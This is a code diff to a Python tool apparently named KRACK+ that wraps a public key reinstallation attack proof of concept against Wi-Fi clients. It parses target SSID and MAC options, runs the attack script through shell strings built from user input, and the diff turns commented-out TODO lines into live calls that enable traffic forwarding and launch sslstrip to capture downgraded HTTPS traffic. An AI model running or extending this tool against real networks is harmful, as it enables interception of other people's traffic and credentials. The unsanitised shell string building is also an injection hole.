@@ -43,6 +43,7 @@ def main():
     USAGE = "\nKRACK+ Scan: krackPlus [-s]\nKRACK+ Attack: krackPlus [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
     path = 'reports/'
     parser = optparse.OptionParser(usage=USAGE)
+
     # KRACK+ Attack options
     parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
     parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
@@ -147,17 +148,16 @@ def main():
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " --dump " + options.pcap + " &"], stdout=attackOutput, shell=True)
 			source=os.listdir("krackattacks-poc-zerokey/krackattack/")
 			destination="reports/"
-			for files in source:
-				if files.endswith(".pcap"):
-					shutil.move(files, destination)
+			for fileName in source:
+				if str(".pcap") in str(fileName):
+					shutil.move(fileName, destination)
 
 		else: 
 			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
 
-		# TODO these must be activated, otherwise user must run these commands manually
-                #subprocess.call(["./krackattacks-poc-zerokey/krackattack/enable_internet_forwarding.sh &"])
-                #subprocess.call(["sslstrip -w sslstrip.log &"])
+                subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
+                subprocess.Popen(["sslstrip -w sslstrip.log &"], shell=True)
 	
 		print("Open Wireshark to see traffic")
 		# User will only see relevant output, unless debug is on
